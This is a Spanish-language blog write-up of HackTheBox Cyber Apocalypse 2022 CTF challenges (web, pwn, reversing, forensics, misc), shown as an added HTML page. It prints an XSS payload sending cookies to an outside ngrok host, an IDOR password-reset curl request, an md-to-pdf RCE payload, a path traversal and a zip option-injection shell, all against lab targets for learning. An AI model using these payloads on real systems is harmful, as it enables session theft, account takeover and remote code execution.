@@ -1,0 +1,862 @@
+<!doctype html><html lang=es dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>HTB Cyber Apocalypse 2022 | Román Zuleta</title>
+<meta name=keywords content="CTF,XSS,JWT,md-to-pdf,IDA,evtx,NTUSER.dat,zip,GTFOBins">
+<meta name=description content="Cyber Apocalypse CTF 2022 - Intergalactic Chase">
+<meta name=author content="Román Zuleta">
+<link rel=canonical href=https://rzul.me/posts/htb-cyber-apocalypse-2022/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css integrity="sha256-7I2jZsovtkdTfMt6j2+ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://rzul.me/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://rzul.me/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://rzul.me/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://rzul.me/apple-touch-icon.png>
+<link rel=mask-icon href=https://rzul.me/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<link rel=alternate hreflang=es href=https://rzul.me/posts/htb-cyber-apocalypse-2022/>
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript><meta property="og:title" content="HTB Cyber Apocalypse 2022">
+<meta property="og:description" content="Cyber Apocalypse CTF 2022 - Intergalactic Chase">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://rzul.me/posts/htb-cyber-apocalypse-2022/">
+<meta property="og:image" content="https://rzul.me/images/posts/htb-cyber-apocalypse-2022/cover.jpg"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2022-05-19T21:21:56-05:00">
+<meta property="article:modified_time" content="2022-05-19T21:21:56-05:00">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://rzul.me/images/posts/htb-cyber-apocalypse-2022/cover.jpg">
+<meta name=twitter:title content="HTB Cyber Apocalypse 2022">
+<meta name=twitter:description content="Cyber Apocalypse CTF 2022 - Intergalactic Chase">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://rzul.me/posts/"},{"@type":"ListItem","position":2,"name":"HTB Cyber Apocalypse 2022","item":"https://rzul.me/posts/htb-cyber-apocalypse-2022/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB Cyber Apocalypse 2022","name":"HTB Cyber Apocalypse 2022","description":"Cyber Apocalypse CTF 2022 - Intergalactic Chase","keywords":["CTF","XSS","JWT","md-to-pdf","IDA","evtx","NTUSER.dat","zip","GTFOBins"],"articleBody":"Intro El CTF de Cyber Apocalypse volvió este año, bajo una temática intergaláctica estando disponible del 14 al 20 de Mayo del 2022. Mediante este enlace se puede obtener más información del evento.\nAquí se encuentran las soluciones de los retos que pude resolver durante mi participación.\nEl write-up aquí presente fue generado por medio de CTFScrapper para la creación de un entorno de trabajo y para la descarga de los archivos de los retos, disponibles en mi compendio de retos.\nRetos Web Kryptos Support Stats    Attribute Info     Difficulty easy   Description The secret vault used by the Longhir’s planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?   File -    Solución Después de navegar y revisar el sitio disponible, dado que se menciona que el admin del sitio visualizará los tickets de servicio dados de alta, se puede suponer que se trata de un ataque XSS.\nHaciendo uso del payload:\nimg src=\"\" onerror=fetch(\"https://a748-189-203-27-57.ngrok.io/\"+document.cookie).then() / Con la intención de robar una cookie de sesión correspondiente a la del admin, como lo menciona el sitio.\nDe acuerdo a como está construida la cookie, se identificó que se trata de un JWT.\nAl buscar más información siendo que con la cookie de sesión no revela ningún cambio al utilizarla se identificó en el código fuente de http:///login se revela un directorio disponible haciendo uso de la cookie obtenida.\nlogin.js\nVista de http:///tickets haciendo uso de la cookie obtenida.\nVista de http:///settings haciendo uso de la cookie obtenida. Exponiendo la funcionalidad del cambio de contraseña del “usuario logueado”.\nAl visualizar el código se puede identificar que el parámetro uid es enviado al hacer uso de la funcionalidad.\nBuscando invocar la funcionalidad haciendo uso de curl se envió el uid del moderador como prueba.\ncurl -v http://13868188223:30914/api/users/update -X POST -H \"Content-Type: application/json\" -d '{\"password\":\"123456\",\"uid\":100}' --cookie \"session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NDYxMzd9Z.HRsjja_ehTEx7FxfjilkTjO3_gRsHkt_jmovFZY1OA\"\nHabiéndo mencionado que se envía el uid en la petición, se decidió cambiar el varlor a 1 siendo que generalmente se reserva ese id para administradores.\nAl haber sido satisfactorio el cambio de contraseña se puede realizar el login como admin, obteniendo de esta manera la bandera.\n Flag: HTB{x55_4nd_id0rs_ar3_fun!!}\n BlinkerFluids Stats    Attribute Info     Difficulty easy   Description Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization’s one of the HR department tools and needs your help to get into their server. Can you help him?   File web_blinkerfluids.zip    Solución Después de identificar la composición del código se encontró que:\n La bandera se encontraba en /flag.txt. Una librería empleada es vulnerable a RCE (md-to-pdf). Por la configuación de la aplicación, sólo se permitía la obtención de archivos en el directorio /static/invoices/.  Al capturar el contenido enviado se utilizó el payload ---js\\n((require(\\\"child_process\\\"))execSync(\\\"cp /flag.txt /static/invoices/flag.txt\\\"))\\n---RCE como cuerpo del archivo markdown.\nEjecutando así el payload y permitiendo navegar a donde se encuentra la bandera\n Flag: HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}\n Pwn Space Pirate: Entrypoint Stats    Attribute Info     Difficulty easy   Description D12 is one of Golden Fang’s missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further.   File pwn_sp_entrypoint.zip    Solución Con los archivos que disponibles se probó localmente el binario y a modo de prueba y error, se identificó que al hacer uso de la contraseña 1234 el binario lee los contenidos del archivo local flag.txt.\n1 Scan card 💳 2 Insert password ↪️  2 [*] Insert password: 1234 [+] Door opened, you can proceed with the passphrase: HTB{f4k3_fl4g_4_t35t1ng} [-] Invalid option! Intruder detected! 🚨 🚨 Por lo que de la misma manera se realizó el mismo proceso en la conexión remota disponible.\n1 Scan card 💳 2 Insert password ↪️  2 [*] Insert password: 1234 [+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!} [-] Invalid option! Intruder detected! 🚨 🚨  Flag: HTB{th3_g4t35_4r3_0p3n!}\n Reversing WIDE Stats    Attribute Info     Difficulty easy   Description We’ve received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You’ve managed to smuggle a discarded access terminal to the Widely Inflated Dimension Editor from his headquarters, but the entry for the dimension has been encrypted. Can you make it inside and take control?   File rev_wide.zip    Solución Después de interactuar con el binario y ver las posibilidades ofrecidas, la opción que se visualiza como cifrada pide una contraseña para visualizar su contenido.\nBuscando el valor en duro mediante su ejecución en IDA, al revisar el flujo se puede ver un valor posible que pudiera ser usado como contraseña.\nObteniendo el valor: sup3rs3cr3tw1d3.\nY al pasarse como contraseña, se obtuvo la bandera.\n Flag: HTB{str1ngs_4r3nt_4lw4ys_4sc11}\n Forensics Puppeteer Stats    Attribute Info     Difficulty easy   Description Planet Longhir is known for it’s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation’s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite’s location was leaked since it is a top-sercret that only Galactic Federation’s council is aware of. Help her analyse the Council’s HQ event logs and solve this mystery.   File forensics_puppeteer.zip    Solución Se uso como base la solución de un reto similar que anteriormente HackTheBox había publicado, que fue encontrado al buscar como realizar análisis a los tipos de archivos dados.\nAl revisar el mismo archivo indicado en el writeup (Microsoft-Windows-PowerShell%4Operationalevtx), que por suerte, también existe en los logs de eventos, se puede visualizar una serie de eventos que tienen que ver con la descripción del reto (contexto del evento).\nEn uno de ellos se encuentra algo que por su composición se asume que es shellcode, al tratar de interpretar que es lo realiza antes de ejecutarse se puede visualizar que el código concatena dos arreglos de bytes declarados antes del shellcode asignando este nuevo valor a otra variable y posteriormente realiza un XOR a cada elemento con 0xd1\n Declaración de stages Concatenación XOR a cada elemento  Se imprimió esta variable para saber su contenido, el cual, al decodearse de los decimales obtenidos a ascii se obtuvo la bandera, haciendo uso de esta receta de CyberChef.\nModificación a script original:\nEjecución:\nDecodeo de valores obtenidos para obtener bandera:\n Flag: HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3}\n Golden Persistence Stats    Attribute Info     Difficulty easy   Description Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir’s space station and escalate their privileges, they will soon be able to activate the station’s defence mechanisms that are able to prevent any spaceship from entering Urkir’s airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again.   File forensics_golden_persistence.zip    Solución Después de investigar acerca del análisis del archivo dado (NTUSER.dat), se encontró este write-up en el que se hace uso de diferentes herramientas para análizar y navegar entre los registros del archivo, del cuál en el registro /Software/Microsoft/Windows/CurrentVersion/Run se identificó el uso de powershell con un parámetro poco convencional. Haciendo uso de reglookup -p /Software/Microsoft/Windows/CurrentVersion/Run NTUSER.DAT.\nDespués de identificar que el parámetro se encontraba codificado en base64 y desencodeándolo, se puede visualizar el script utilizado.\nDe acuerdo al código, el script hace uso de los valores de los registros indicados por lo que en pasos consiguientes fue necesario buscar los mismos.\nExtrayendo de la misma manera los valores se pueden sustituir las variables correspondientes directamente.\nAl ejecutar la reconstrucción del script, aún presentaba inconsistencias de sintaxis, al limpiarlo para buscar una ejecución correcta quedó de la siguiente manera\nScript completo function encr { param( [Byte[]]$data, [Byte[]]$key ) [Byte[]]$buffer = New-Object Byte[] $data.Length $data.CopyTo($buffer, 0) [Byte[]]$s = New-Object Byte[] 256; [Byte[]]$k = New-Object Byte[] 256; for ($i = 0; $i -lt 256; $i++) { $s[$i] = [Byte]$i; $k[$i] = $key[$i % $key.Length]; } $j = 0; for ($i = 0; $i -lt 256; $i++) { $j = ($j + $s[$i] + $k[$i]) % 256; $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp; } $i = $j = 0; for ($x = 0; $x -lt $buffer.Length; $x++) { $i = ($i + 1) % 256; $j = ($j + $s[$i]) % 256; $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp; [int]$t = ($s[$i] + $s[$j]) % 256; $buffer[$x] = $buffer[$x] -bxor $s[$t]; } return $buffer } function HexToBin { param( [Parameter( Position=0, Mandatory=$true, ValueFromPipeline=$true) ] [string]$s) $return = @() for ($i = 0; $i -lt $s.Length ; $i += 2) { $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber) } Write-Output $return } $enc = [System.Text.Encoding]::ASCII [Byte[]]$key = $enc.GetBytes(\"Q0mmpr4B5rvZi3pS\") #$encrypted1 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\ZYb78P4s).t3RBka5tL #$encrypted2 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\BjqAtIen).uLltjjW #$encrypted3 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\AppDataLow\\t03A1Stq).uY4S39Da #$encrypted4 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\Google\\Nv50zeG).Kb19fyhl #$encrypted5 = (Get-ItemProperty -Path HKCU:\\AppEvents\\Jx66ZG0O).jH54NW8C $encrypted1 = \"F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39\" $encrypted2 = \"CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1\" $encrypted3 = \"C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D\" $encrypted4 = \"D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1\" $encrypted5 = \"84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB\" $encrypted = \"$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)\" [Byte[]]$data = HexToBin $encrypted $DecryptedBytes = encr $data $key $DecryptedString = $enc.GetString($DecryptedBytes) $DecryptedString #$DecryptedString|iex Del cuál al ejecutarse se obtiene el valor original del parámetro ejecutado, encontrando de esta manera la bandera.\n Flag: HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}\n Misc Compressor Stats    Attribute Info     Difficulty easy   Description Ramona’s obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang’s ownership called “Compressor”, which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?   File -    Solución Para este reto se exponía una conexión a un host en donde se ofrecían diferentes opciones para interactuar con el binario disponible.\nDe acuerdo a la interacción se encontraron 2 formas de resolver el reto, mediante un Path traversal haciendo uso de la ejecución de cat disponible.\n└─$ nc 138.68.183.64 31076 [*] Directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S Component List: +===============+ | | | 1. Head 🤖 | | 2. Torso 🦴 | | 3. Hands 💪 | | 4. Legs 🦵 | | | +===============+ [*] Choose component: 1 [*] Sub-directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S/Head Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./) 4. Compress artifact (zip .zip  ) 5. Change directory (cd ) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action: 3 Insert name you want to read: ../../flag.txt HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5} Y también por medio de la utilidad expuesta de zip se encuentra un GTFOBin el cuál permite la invocación de una shell.\nActions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./) 4. Compress artifact (zip .zip  ) 5. Change directory (cd ) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action: 4 Insert .zip: Insert : /etc/passwd Insert : -T -TT 'sh #' adding: etc/passwd (deflated 62%) ls -la total 12 drwxr-sr-x 2 ctf ctf 4096 May 18 23:01 . drwxr-sr-x 6 ctf ctf 4096 May 18 23:00 .. -rw------- 1 ctf ctf 650 May 18 23:01 zikfJpfK cd .. ls -la total 24 drwxr-sr-x 6 ctf ctf 4096 May 18 23:00 . drwxr-sr-x 1 ctf ctf 4096 May 18 23:00 .. drwxr-sr-x 2 ctf ctf 4096 May 18 23:00 Hands drwxr-sr-x 2 ctf ctf 4096 May 18 23:01 Head drwxr-sr-x 2 ctf ctf 4096 May 18 23:00 Legs drwxr-sr-x 2 ctf ctf 4096 May 18 23:00 Torso cd .. ls -la total 44 drwxr-sr-x 1 ctf ctf 4096 May 18 23:00 . drwxr-xr-x 1 root root 4096 Mar 3 15:18 .. drwxr-sr-x 6 ctf ctf 4096 May 18 22:57 5pSXN8iJRdGc7Y8nk5oNcKcrJKFTPK21 -rwxrwxr-x 1 root root 3166 May 12 23:51 artifacts.py -rw-rw-r-- 1 root root 263 May 12 23:32 clear.py -rw-rw-r-- 1 root root 38 May 12 17:37 flag.txt drwxr-sr-x 6 ctf ctf 4096 May 18 22:55 kPeKQsYEx9Z6ZKkBrdtWmQKdS98CURJl drwxr-sr-x 6 ctf ctf 4096 May 18 22:54 kWHPODHQFKSletaDKHB2AgJslbm6fwbb drwxr-sr-x 6 ctf ctf 4096 May 18 23:00 tHV1tdX82QcPllglF8wa6AhU24FRZS4S drwxr-sr-x 6 ctf ctf 4096 May 18 22:55 wqVpR4QLSsuu5QiWRqhPNLuYh2aHzlaI  FLAG: HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}\n Composición Como parte del ejercicio “post-reto” se extrajo el código correspondiente al reto (artifacts.py y clear.py).\nartifacts.py #!/usr/bin/python3 import os, random from termcolor import colored whitelist = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.'#/ \" PATH = \"./\" sub_array = [\"Head\", \"Torso\", \"Hands\", \"Legs\"] # Create random directory def rand_dirname(length=32): charset = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\" dirname = \"\" while len(dirname)  length: dirname += random.choice(charset) return dirname def check_filename(filename): return all(i in whitelist for i in filename) def change_sub_dir(idx, color): print(colored(f\"\\n[*] Sub-directory to work in: {dirname}/{sub_array[idx]}\\n\", color)) os.chdir(PATH + sub_array[idx]) def subjects(): subs = \"\"\"\\nComponent List: +===============+ | | | 1. Head 🤖 | | 2. Torso 🦴 | | 3. Hands 💪 | | 4. Legs 🦵 | | | +===============+ \"\"\" print(colored(subs, \"magenta\")) ans = int(input(colored(\"[*] Choose component: \", \"magenta\"))) if ans == 1: change_sub_dir(0, \"blue\") elif ans == 2: change_sub_dir(1, \"green\") elif ans == 3: change_sub_dir(2, \"cyan\") elif ans == 4: change_sub_dir(3, \"yellow\") else: print(colored(\"\\n[-] Invalid option!\\n\", \"red\")) exit() def menu(): m = \"\"\" Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./) 4. Compress artifact (zip .zip  ) 5. Change directory (cd ) 6. Clean directory (rm -rf ./*) 7. Exit \"\"\" print(colored(m, \"yellow\")) return int(input(colored(\"[*] Choose action: \", \"yellow\"))) def create_file(): fname = input(colored(\"Insert name: \", \"yellow\")).strip() if not check_filename(fname): print(colored(\"\\n[-] Invalid name!\\n\", \"red\")) exit() os.system(f\"touch {fname}\") contents = input(colored(\"\\nInsert content: \", \"yellow\")) f = open(fname, \"a\") f.write(contents) f.close() print(\"\\n\") print(colored(f\"[+] Artifact [{fname}] was created successfuly!\", \"green\")) def zip(): zip_name = input(colored(\"Insert .zip: \", \"blue\")).strip() files = input(colored(\"Insert : \", \"blue\")).strip() options = input(colored(\"Insert : \", \"blue\")).strip() if not check_filename(zip_name) or not check_filename(files) or not check_filename(options): print(colored(\"\\n[-] Invalid name!\\n\", \"red\")) exit() os.system(f\"zip {zip_name}.zip {files}{options}\") # Create directory dirname = rand_dirname() print(colored(f\"\\n[*] Directory to work in: {dirname}\", \"cyan\")) os.mkdir(PATH + dirname) os.chdir(PATH + dirname) os.system(\"mkdir -p Head Torso Hands Legs\") ans = subjects() while True: # Choose action act = menu() print(\"\\n\") if act == 1: create_file() elif act == 4: zip() elif act == 3: fname = input(\"Insert name you want to read: \").strip() os.system(f\"cat ./{fname}\") elif act == 2: os.system(\"pwd; ls -la\") elif act == 6: os.system(\"rm -rf ./*\") elif act == 5: os.chdir(f\"../../{dirname}\") ans = subjects() else: print(colored(\"\\n[-] Invalid option!\\n\", \"red\")) os.system(\"rm -rf ./*\") exit() clear.py import os os.system('ls -la  temp') f = open('temp', 'r') for line in f: arr = line.split() try: if len(arr[8])  16: os.system(f'rm -rf {arr[8]}') except: print('') print(f'[+] Directories have been deleted!\\n') os.system('rm -f ./temp') Conclusión En lo personal encontré el CTF bastante divertido y me permitió explorar cosas que hasta el momento no había podido tocar como lo fueron los retos de forense, enfocados más al lado de Blue Team. Como ejercicio para práctica futura y de aprendizaje guardé los retos y sus archivos en este repositorio para poder resolverlos siguiendo los write-ups públicos y aprender de ellos.\n","wordCount":"2647","inLanguage":"es","image":"https://rzul.me/images/posts/htb-cyber-apocalypse-2022/cover.jpg","datePublished":"2022-05-19T21:21:56-05:00","dateModified":"2022-05-19T21:21:56-05:00","author":{"@type":"Person","name":"Román Zuleta"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rzul.me/posts/htb-cyber-apocalypse-2022/"},"publisher":{"@type":"Organization","name":"Román Zuleta","logo":{"@type":"ImageObject","url":"https://rzul.me/favicon.ico"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://rzul.me/ accesskey=h title="Román Zuleta (Alt + H)">Román Zuleta</a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+<ul class=lang-switch><li>|</li>
+<li>
+<a href=https://rzul.me/en/ title=English aria-label=English>En</a>
+</li>
+</ul>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://rzul.me/archives/ title=Archivo>
+<span>Archivo</span>
+</a>
+</li>
+<li>
+<a href=https://rzul.me/categories/ title=Categorías>
+<span>Categorías</span>
+</a>
+</li>
+<li>
+<a href=https://rzul.me/tags/ title=Etiquetas>
+<span>Etiquetas</span>
+</a>
+</li>
+<li>
+<a href=https://rzul.me/search/ title="Buscar (Alt + /)" accesskey=/>
+<span>Buscar</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://rzul.me/>Inicio</a>&nbsp;»&nbsp;<a href=https://rzul.me/posts/>Posts</a></div>
+<h1 class=post-title>
+HTB Cyber Apocalypse 2022
+</h1>
+<div class=post-description>
+Cyber Apocalypse CTF 2022 - Intergalactic Chase
+</div>
+<div class=post-meta><span title="2022-05-19 21:21:56 -0500 CDT">mayo 19, 2022</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;Román Zuleta
+</div>
+</header>
+<figure class=entry-cover><img loading=lazy src=https://rzul.me/images/posts/htb-cyber-apocalypse-2022/cover.jpg alt="HTB Cyber Apocalypse Cover">
+<p></p>
+</figure><div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Tabla de Contenidos</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#intro aria-label=Intro>Intro</a></li>
+<li>
+<a href=#retos aria-label=Retos>Retos</a><ul>
+<li>
+<a href=#web aria-label=Web>Web</a><ul>
+<li>
+<a href=#kryptos-support aria-label="Kryptos Support">Kryptos Support</a><ul>
+<li>
+<a href=#stats aria-label=Stats>Stats</a></li>
+<li>
+<a href=#soluci%c3%b3n aria-label=Solución>Solución</a></li></ul>
+</li>
+<li>
+<a href=#blinkerfluids aria-label=BlinkerFluids>BlinkerFluids</a><ul>
+<li>
+<a href=#stats-1 aria-label=Stats>Stats</a></li>
+<li>
+<a href=#soluci%c3%b3n-1 aria-label=Solución>Solución</a></li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#pwn aria-label=Pwn>Pwn</a><ul>
+<li>
+<a href=#space-pirate-entrypoint aria-label="Space Pirate: Entrypoint">Space Pirate: Entrypoint</a><ul>
+<li>
+<a href=#stats-2 aria-label=Stats>Stats</a></li>
+<li>
+<a href=#soluci%c3%b3n-2 aria-label=Solución>Solución</a></li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#reversing aria-label=Reversing>Reversing</a><ul>
+<li>
+<a href=#wide aria-label=WIDE>WIDE</a><ul>
+<li>
+<a href=#stats-3 aria-label=Stats>Stats</a></li>
+<li>
+<a href=#soluci%c3%b3n-3 aria-label=Solución>Solución</a></li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#forensics aria-label=Forensics>Forensics</a><ul>
+<li>
+<a href=#puppeteer aria-label=Puppeteer>Puppeteer</a><ul>
+<li>
+<a href=#stats-4 aria-label=Stats>Stats</a></li>
+<li>
+<a href=#soluci%c3%b3n-4 aria-label=Solución>Solución</a></li></ul>
+</li>
+<li>
+<a href=#golden-persistence aria-label="Golden Persistence">Golden Persistence</a><ul>
+<li>
+<a href=#stats-5 aria-label=Stats>Stats</a></li>
+<li>
+<a href=#soluci%c3%b3n-5 aria-label=Solución>Solución</a><ul>
+<li>
+<a href=#script-completo aria-label="Script completo">Script completo</a></li></ul>
+</li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#misc aria-label=Misc>Misc</a><ul>
+<li>
+<a href=#compressor aria-label=Compressor>Compressor</a><ul>
+<li>
+<a href=#stats-6 aria-label=Stats>Stats</a></li>
+<li>
+<a href=#soluci%c3%b3n-6 aria-label=Solución>Solución</a></li>
+<li>
+<a href=#composici%c3%b3n aria-label=Composición>Composición</a><ul>
+<li>
+<a href=#artifactspy aria-label=artifacts.py>artifacts.py</a></li>
+<li>
+<a href=#clearpy aria-label=clear.py>clear.py</a></li></ul>
+</li></ul>
+</li></ul>
+</li></ul>
+</li>
+<li>
+<a href=#conclusi%c3%b3n aria-label=Conclusión>Conclusión</a>
+</li>
+</ul>
+</div>
+</details>
+</div>
+<div class=post-content><h1 id=intro>Intro<a hidden class=anchor aria-hidden=true href=#intro>#</a></h1>
+<p>El CTF de Cyber Apocalypse volvió este año, bajo una temática intergaláctica estando disponible del 14 al 20 de Mayo del 2022. Mediante <a href=https://www.hackthebox.com/events/cyber-apocalypse-2022>este enlace</a> se puede obtener más información del evento.</p>
+<p>Aquí se encuentran las soluciones de los retos que pude resolver durante mi participación.</p>
+<p><em>El write-up aquí presente fue generado por medio de <a href=https://github.com/srrequiem/CTFScrapper>CTFScrapper</a> para la creación de un entorno de trabajo y para la descarga de los archivos de los retos, disponibles en <a href=https://github.com/srrequiem/CTF-Challenge-Compilation>mi compendio de retos</a>.</em></p>
+<h1 id=retos>Retos<a hidden class=anchor aria-hidden=true href=#retos>#</a></h1>
+<h2 id=web>Web<a hidden class=anchor aria-hidden=true href=#web>#</a></h2>
+<h3 id=kryptos-support>Kryptos Support<a hidden class=anchor aria-hidden=true href=#kryptos-support>#</a></h3>
+<h4 id=stats>Stats<a hidden class=anchor aria-hidden=true href=#stats>#</a></h4>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>The secret vault used by the Longhir&rsquo;s planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?</td>
+</tr>
+<tr>
+<td>File</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<h4 id=solución>Solución<a hidden class=anchor aria-hidden=true href=#solución>#</a></h4>
+<p>Después de navegar y revisar el sitio disponible, dado que se menciona que el admin del sitio visualizará los tickets de servicio dados de alta, se puede suponer que se trata de un ataque XSS.</p>
+<p>Haciendo uso del payload:</p>
